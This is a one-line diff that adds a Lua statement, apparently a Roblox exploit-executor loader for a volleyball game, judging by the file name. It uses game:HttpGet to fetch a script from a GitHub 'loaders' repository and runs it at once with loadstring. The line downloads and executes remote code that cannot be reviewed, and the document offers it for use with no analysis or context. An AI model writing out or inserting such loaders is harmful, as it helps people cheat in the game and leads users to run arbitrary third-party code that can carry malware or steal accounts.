@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/spooky-beyond-volleyball-league-spam3-a3h5edj2o3gxux.lua"))()
